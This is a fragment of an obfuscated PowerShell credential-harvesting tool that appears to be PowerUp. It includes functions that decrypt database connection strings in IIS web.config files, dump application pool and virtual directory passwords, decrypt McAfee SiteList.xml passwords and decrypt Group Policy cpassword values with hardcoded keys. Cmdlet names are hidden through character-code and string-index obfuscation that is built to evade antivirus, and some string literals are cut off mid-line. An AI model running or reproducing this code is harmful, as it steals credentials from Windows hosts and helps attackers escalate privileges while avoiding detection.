        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'UnattendPath' $_
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name UnattendPath
        $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $MZ8p5YquBs
    }

    $ErrorActionPreference = $FpgPQLcTbdjacZJY4bY8c
}


function Get-WebConfig {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $FpgPQLcTbdjacZJY4bY8c = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    
    if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '')  ("$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\InetSRV\appcmd.exe")) {

        
        $aweEFm8tRMpsUSc = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Data.DataTable

        
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('user')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('pass')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('dbserv')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('vdir')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('path')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('encr')

        
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

            $csgoai = $_

            
            if ($_ -like "*%*") {
                $zz35PCxSjjfzp1n1gDqP8ZpQ = "`$BIU3V9yGRDMpzj2ugH:"+$_.split("%")[1]
                $R4zpVDxKbYGS0iFAB7lwuyTMs = & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') $zz35PCxSjjfzp1n1gDqP8ZpQ
                $9sJN6AGR21awlr37m0Hnb = $_.split('%')[2]
                $csgoai  = $R4zpVDxKbYGS0iFAB7lwuyTMs+$9sJN6AGR21awlr37m0Hnb
            }

            
            $csgoai | & (("NWPLigFVqQOdBCISuf6H-exAsT3M2z9ap8D07lYKJ5rtwn4joymXGbZvEkc1hRU")[52,21,43,20,13,60,4,37,11,14,43,21,50] -join '') -Recurse -Filter web.config | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

                
                $9Zm6tHrFkdvcU5Kaeo7gL = $_.fullname

                
                [xml]$E2DKVUI6id = & (("wLxGyrV65JpFlm91OSD2zt-sdoI7vibBjNcHf0TPehXku4YRCgUnWEqaKMQA83Z")[3,40,21,22,48,25,51,21,40,51,21] -join '') $_.fullname

                
                if ($E2DKVUI6id.configuration.connectionStrings.add) {

                    
                    $E2DKVUI6id.configuration.connectionStrings.add|
                    & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

                        [String]$40K6aHopcODLqYk1 = $_.connectionString
                        if ($40K6aHopcODLqYk1 -like '*password*') {
                            $G7twTHpWqNoDKC3Ylf = $40K6aHopcODLqYk1.Split('=')[3].Split(';')[0]
                            $5rUT9VSAsWwG2 = $40K6aHopcODLqYk1.Split('=')[4].Split(';')[0]
                            $hb9EmPGgKqMa7vBS8n5RNO = $40K6aHopcODLqYk1.Split('=')[1].Split(';')[0]
                            $mFfb1 = $csgoai
                            $BM8giNYk76V1Ca0JUIHSWKsbj = 'No'
                            $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Rows.Add($G7twTHpWqNoDKC3Ylf, $5rUT9VSAsWwG2, $hb9EmPGgKqMa7vBS8n5RNO, $mFfb1, $9Zm6tHrFkdvcU5Kaeo7gL, $BM8giNYk76V1Ca0JUIHSWKsbj)
                        }
                    }
                }
                else {

                    
                    $TjXLFsCKNglMU2IRnmuaJ = & (("NWPLigFVqQOdBCISuf6H-exAsT3M2z9ap8D07lYKJ5rtwn4joymXGbZvEkc1hRU")[52,21,43,20,13,60,4,37,11,14,43,21,50] -join '') -b3CtzFF8zYowylvWrqwrJZd "$BIU3V9yGRDMpzj2ugH:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | & (("AJ3HQW6zSn4uhLfj7Vwr5CkBpbNxmRDeEGOKo9qMa21vyigtUPsT8cdlIF0Z-YX")[8,36,19,47,60,34,25,15,31,53,47] -join '') -Descending | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) fullname -First 1

                    
                    if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '')  ($TjXLFsCKNglMU2IRnmuaJ.FullName)) {

                        
                        $iBOK7QwPSy = (& ([string]::join('', ( (71,101,116,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) $BIU3V9yGRDMpzj2ugH:temp).FullName + '\web.config'

                        
                        if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '')  ($iBOK7QwPSy)) {
                            & ([string]::join('', ( (82,101,109,111,118,101,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) $iBOK7QwPSy
                        }

                        
                        & (("ZuJDEtl0MfO3yzhw5arbevdFxWX1n6sqi7Q4NIpYAPGcmHgLUSRBkoT9-C8V2jK")[57,53,38,12,56,37,5,20,44] -join '') $9Zm6tHrFkdvcU5Kaeo7gL $iBOK7QwPSy

                        
                        $ylBtUIdA17gXNuFZ = $TjXLFsCKNglMU2IRnmuaJ.fullname+' -pdf "connectionStrings" (get-item $BIU3V9yGRDMpzj2ugH:temp).FullName'
                        $BpZKcilASnhDR0mHwzFy = & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') $ylBtUIdA17gXNuFZ

                        
                        [xml]$3INlHiM3DWE5n9t4Mq3CGEE = & (("wLxGyrV65JpFlm91OSD2zt-sdoI7vibBjNcHf0TPehXku4YRCgUnWEqaKMQA83Z")[3,40,21,22,48,25,51,21,40,51,21] -join '') $iBOK7QwPSy

                        
                        if ($3INlHiM3DWE5n9t4Mq3CGEE.configuration.connectionStrings.add) {

                            
                            $3INlHiM3DWE5n9t4Mq3CGEE.configuration.connectionStrings.add | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

                                [String]$40K6aHopcODLqYk1 = $_.connectionString
                                if ($40K6aHopcODLqYk1 -like '*password*') {
                                    $G7twTHpWqNoDKC3Ylf = $40K6aHopcODLqYk1.Split('=')[3].Split(';')[0]
                                    $5rUT9VSAsWwG2 = $40K6aHopcODLqYk1.Split('=')[4].Split(';')[0]
                                    $hb9EmPGgKqMa7vBS8n5RNO = $40K6aHopcODLqYk1.Split('=')[1].Split(';')[0]
                                    $mFfb1 = $csgoai
                                    $BM8giNYk76V1Ca0JUIHSWKsbj = 'Yes'
                                    $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Rows.Add($G7twTHpWqNoDKC3Ylf, $5rUT9VSAsWwG2, $hb9EmPGgKqMa7vBS8n5RNO, $mFfb1, $9Zm6tHrFkdvcU5Kaeo7gL, $BM8giNYk76V1Ca0JUIHSWKsbj)
                                }
                            }
                        }
                        else {
                            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Decryption of $9Zm6tHrFkdvcU5Kaeo7gL failed."
                            $False
                        }
                    }
                    else {
                        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        
        if ( $aweEFm8tRMpsUSc.rows.Count -gt 0 ) {
            
            $aweEFm8tRMpsUSc | & (("AJ3HQW6zSn4uhLfj7Vwr5CkBpbNxmRDeEGOKo9qMa21vyigtUPsT8cdlIF0Z-YX")[8,36,19,47,60,34,25,15,31,53,47] -join '') user,pass,dbserv,vdir,path,encr | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'No connection strings found.'
            $False
        }
    }
    else {
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $FpgPQLcTbdjacZJY4bY8c
}


function Get-ApplicationHost {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $FpgPQLcTbdjacZJY4bY8c = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    
    if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '')  ("$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe")) {
        
        $aweEFm8tRMpsUSc = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Data.DataTable

        
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('user')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('pass')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('type')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('vdir')
        $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Columns.Add('apppool')

        
        & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') "$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

            
            $Dx0pIHxjrSY = $_

            
            $TS1ZDKcQYW40XdCUwk3u = "$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$Dx0pIHxjrSY`" /text:processmodel.username"
            $nySkeU8ADGc6INM2Pg = & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') $TS1ZDKcQYW40XdCUwk3u

            
            $AORm4e92PL0T7rcGqUonx8Ij = "$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$Dx0pIHxjrSY`" /text:processmodel.password"
            $bq0GXDkgjKh5JdnTx = & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') $AORm4e92PL0T7rcGqUonx8Ij

            
            if (($bq0GXDkgjKh5JdnTx -ne "") -and ($bq0GXDkgjKh5JdnTx -isnot [system.array])) {
                
                $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Rows.Add($nySkeU8ADGc6INM2Pg, $bq0GXDkgjKh5JdnTx,'Application Pool','NA',$Dx0pIHxjrSY)
            }
        }

        
        & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') "$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

            
            $E4rDPOnMxh1WtwRET = $_

            
            $45Bb0SPD7EX2ZV9klRYCw = "$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$E4rDPOnMxh1WtwRET`" /text:userName"
            $IvtJS3sXGqhKd = & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') $45Bb0SPD7EX2ZV9klRYCw

            
            $ZHVuLW0xQ8fGYP = "$BIU3V9yGRDMpzj2ugH:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$E4rDPOnMxh1WtwRET`" /text:password"
            $JXwYf9B0Ltue2aiG4PAhkVO = & (("-ZQU7Nsxfp5izWeLduS9mrB1k2tyVwvo4Rn03gHYjaTqGFJMbPEAKXhC6cDl8OI")[62,34,30,31,24,14,0,50,7,9,21,14,6,6,11,31,34] -join '') $ZHVuLW0xQ8fGYP

            
            if (($JXwYf9B0Ltue2aiG4PAhkVO -ne "") -and ($JXwYf9B0Ltue2aiG4PAhkVO -isnot [system.array])) {
                
                $BpZKcilASnhDR0mHwzFy = $aweEFm8tRMpsUSc.Rows.Add($IvtJS3sXGqhKd, $JXwYf9B0Ltue2aiG4PAhkVO,'Virtual Directory',$E4rDPOnMxh1WtwRET,'NA')
            }
        }

        
        if ( $aweEFm8tRMpsUSc.rows.Count -gt 0 ) {
            
            $aweEFm8tRMpsUSc |  & (("AJ3HQW6zSn4uhLfj7Vwr5CkBpbNxmRDeEGOKo9qMa21vyigtUPsT8cdlIF0Z-YX")[8,36,19,47,60,34,25,15,31,53,47] -join '') type,user,pass,vdir,apppool | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) user,pass,type,vdir,apppool -Unique
        }
        else {
            
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $FpgPQLcTbdjacZJY4bY8c
}


function Get-SiteListPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.SiteListPassword')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $_ })]
        [String[]]
        $b3CtzFF8zYowylvWrqwrJZd
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            
            
            
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $mNoHvgd0zjxOwC3lutD8r
            )

            
            & (("7C-KHnlO1WJ5NI49fxQDuPm2igzFVSbX8oMZ0whyv3pseLkAjEqrBTcadGYt6UR")[47,56,56,2,53,39,42,44] -join '') -Assembly System.Security
            & (("7C-KHnlO1WJ5NI49fxQDuPm2igzFVSbX8oMZ0whyv3pseLkAjEqrBTcadGYt6UR")[47,56,56,2,53,39,42,44] -join '') -Assembly System.Core

            
            $CuAU4aJ6xbwNXt9bVugQ = [System.Text.Encoding]::ASCII
            $Nvnqw6mY = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Security.Cryptography.SHA1CryptoServiceProvider
            $haNtyPCss = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Security.Cryptography.TripleDESCryptoServiceProvider

            
            $N65Cys3Xg0Op = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            
            $8iqF = 0;
            $lRWIUo9gziBxwaXEG3c = [System.Convert]::FromBase64String($mNoHvgd0zjxOwC3lutD8r) | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') { $_ -BXor $N65Cys3Xg0Op[$8iqF++ % $N65Cys3Xg0Op.Length] }

            
            $e7teNp6l = $Nvnqw6mY.ComputeHash($CuAU4aJ6xbwNXt9bVugQ.GetBytes('<!@

            
            $haNtyPCss.Mode = 'ECB'
            $haNtyPCss.Padding = 'None'
            $haNtyPCss.Key = $e7teNp6l

            
            $8hO9HBDN5FfTLjvM1IS70 = $haNtyPCss.CreateDecryptor().TransformFinalBlock($lRWIUo9gziBxwaXEG3c, 0, $lRWIUo9gziBxwaXEG3c.Length)

            
            $mkmfzP47elbOLr48y08 = [Array]::IndexOf($8hO9HBDN5FfTLjvM1IS70, [Byte]0)
            if ($mkmfzP47elbOLr48y08 -ne -1) {
                $EMFts7jk = $CuAU4aJ6xbwNXt9bVugQ.GetString($8hO9HBDN5FfTLjvM1IS70[0..($mkmfzP47elbOLr48y08-1)])
            }
            else {
                $EMFts7jk = $CuAU4aJ6xbwNXt9bVugQ.GetString($8hO9HBDN5FfTLjvM1IS70)
            }

            & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -TypeName PSObject -Property @{'Encrypted'=$mNoHvgd0zjxOwC3lutD8r;'Decrypted'=$EMFts7jk}
        }

        function Local:Get-SitelistField {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $b3CtzFF8zYowylvWrqwrJZd
            )

            try {
                [Xml]$70m4gwBVQeOSlITcH1YdpU = & (("wLxGyrV65JpFlm91OSD2zt-sdoI7vibBjNcHf0TPehXku4YRCgUnWEqaKMQA83Z")[3,40,21,22,48,25,51,21,40,51,21] -join '') -b3CtzFF8zYowylvWrqwrJZd $b3CtzFF8zYowylvWrqwrJZd

                if ($70m4gwBVQeOSlITcH1YdpU.InnerXml -Like "*password*") {
                    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Potential password in found in $b3CtzFF8zYowylvWrqwrJZd"

                    $70m4gwBVQeOSlITcH1YdpU.SiteLists.SiteList.ChildNodes | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                        try {
                            $cwqvFl1 = $_.Password.'

                            if ($_.Password.Encrypted -eq 1) {
                                
                                $UWzk6VwOFHvd8eioq3jg9 = if ($cwqvFl1) { (Get-DecryptedSitelistPassword -B64Pass $cwqvFl1).Decrypted } else {''}
                            }
                            else {
                                $UWzk6VwOFHvd8eioq3jg9 = $cwqvFl1
                            }

                            $yHzaY = if ($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $b3CtzFF8zYowylvWrqwrJZd = if ($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $L2mJyAqihDVaTXwkRefPMFHBl = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $yHzaY;
                                'Path' = $b3CtzFF8zYowylvWrqwrJZd;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $cwqvFl1;
                                'DecPassword' = $UWzk6VwOFHvd8eioq3jg9;
                            }
                            $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -TypeName PSObject -Property $L2mJyAqihDVaTXwkRefPMFHBl
                            $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.SiteListPassword')
                            $MZ8p5YquBs
                        }
                        catch {
                            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) "Error parsing file '$b3CtzFF8zYowylvWrqwrJZd' : $_"
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Path']) {
            $5tR6MOjWnCE7N082 = $b3CtzFF8zYowylvWrqwrJZd
        }
        else {
            $5tR6MOjWnCE7N082 = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $5tR6MOjWnCE7N082 | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') { & (("NWPLigFVqQOdBCISuf6H-exAsT3M2z9ap8D07lYKJ5rtwn4joymXGbZvEkc1hRU")[52,21,43,20,13,60,4,37,11,14,43,21,50] -join '') -b3CtzFF8zYowylvWrqwrJZd $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { $_ } | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistField -b3CtzFF8zYowylvWrqwrJZd $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {


    [CmdletBinding()]
    Param()

    
    & (("VMHQ215PIwbJkrl-nhzLYtvxmERdi3XCGq0S6pyNfWO9KBso4aDZ8UcgeFu7jAT")[35,56,21,15,35,21,13,28,54,21,1,47,27,56] -join '') -Version 2

    
    & (("7C-KHnlO1WJ5NI49fxQDuPm2igzFVSbX8oMZ0whyv3pseLkAjEqrBTcadGYt6UR")[47,56,56,2,53,39,42,44] -join '') -Assembly System.Security
    & (("7C-KHnlO1WJ5NI49fxQDuPm2igzFVSbX8oMZ0whyv3pseLkAjEqrBTcadGYt6UR")[47,56,56,2,53,39,42,44] -join '') -Assembly System.Core

    
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $ao9pjA4IEU8tQlmZhb6
        )

        try {
            
            $2JmaSzwlf7yBNCcIdp4ug3 = ($ao9pjA4IEU8tQlmZhb6.length % 4)

            switch ($2JmaSzwlf7yBNCcIdp4ug3) {
                '1' {$ao9pjA4IEU8tQlmZhb6 = $ao9pjA4IEU8tQlmZhb6.Substring(0,$ao9pjA4IEU8tQlmZhb6.Length -1)}
                '2' {$ao9pjA4IEU8tQlmZhb6 += ('=' * (4 - $2JmaSzwlf7yBNCcIdp4ug3))}
                '3' {$ao9pjA4IEU8tQlmZhb6 += ('=' * (4 - $2JmaSzwlf7yBNCcIdp4ug3))}
            }

            $HFgzCV = [Convert]::FromBase64String($ao9pjA4IEU8tQlmZhb6)

            
            $QhxkFbk3UprZmpUQg7TT = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $uYKjoZpZaslPxC = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            
            $6IVCXYPgIZH = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Byte[]($QhxkFbk3UprZmpUQg7TT.IV.Length)
            $QhxkFbk3UprZmpUQg7TT.IV = $6IVCXYPgIZH
            $QhxkFbk3UprZmpUQg7TT.Key = $uYKjoZpZaslPxC
            $tOfazqNjcAMWhDwX8vSRnr = $QhxkFbk3UprZmpUQg7TT.CreateDecryptor()
            [Byte[]] $I9SgsD1UAVCO0vPZK7uk8B2 = $tOfazqNjcAMWhDwX8vSRnr.TransformFinalBlock($HFgzCV, 0, $HFgzCV.length)

            return [$([char](0+83-0)+[char](0+121-0)+[char](30+115-30)+[char](13+116-13)+[char](25+101-25)+[char](17+109-17)+[char](72*46/72)+[char](0+84-0)+[char](10+101-10)+[char](0+120-0)+[char](0+116-0)+[char](73*46/73)+[char](37+85-37)+[char](23*110/23)+[char](0+105-0)+[char](0+99-0)+[char](111+111-111)+[char](75*100/75)+[char](83*101/83)+[char](91*69/91)+[char](78*110/78)+[char](11+99-11)+[char](69*111/69)+[char](115*100/115)+[char](0+105-0)+[char](12*110/12)+[char](94+103-94))]::Unicode.GetString($I9SgsD1UAVCO0vPZK7uk8B2)
        }

        catch {
            & ([string]::join('', ( (87,114,105,116,101,45,69,114,114,111,114) |%{ ( [char][int] $_)})) | % {$_}) $Error[0]
        }
    }

    
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $k8DbU
        )

        try {
            $NnuUszePDhMFrotYQ7d9 = & ([string]::join('', ( (83,112,108,105,116,45,80,97,116,104) |%{ ( [char][int] $_)})) | % {$_}) $k8DbU -Leaf
            [XML] $rI8GYu4O0WkzwD = & (("wLxGyrV65JpFlm91OSD2zt-sdoI7vibBjNcHf0TPehXku4YRCgUnWEqaKMQA83Z")[3,40,21,22,48,25,51,21,40,51,21] -join '') ($k8DbU)

            $ao9pjA4IEU8tQlmZhb6 = @()
            $MJNrf2Xbpio7GuhH = @()
            $F36kDlAlTHJBM6QV2fO = @()
            $xM2QAYhsm9 = @()
            $IQ2MUGLwEkxjZ = @()

            
            if ($rI8GYu4O0WkzwD.innerxml -like "*cpassword*"){

                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Potential password in $k8DbU"

                switch ($NnuUszePDhMFrotYQ7d9) {
                    'Groups.xml' {
                        $ao9pjA4IEU8tQlmZhb6 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Groups/User/Properties/@cpassword" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $MJNrf2Xbpio7GuhH += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Groups/User/Properties/@userName" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
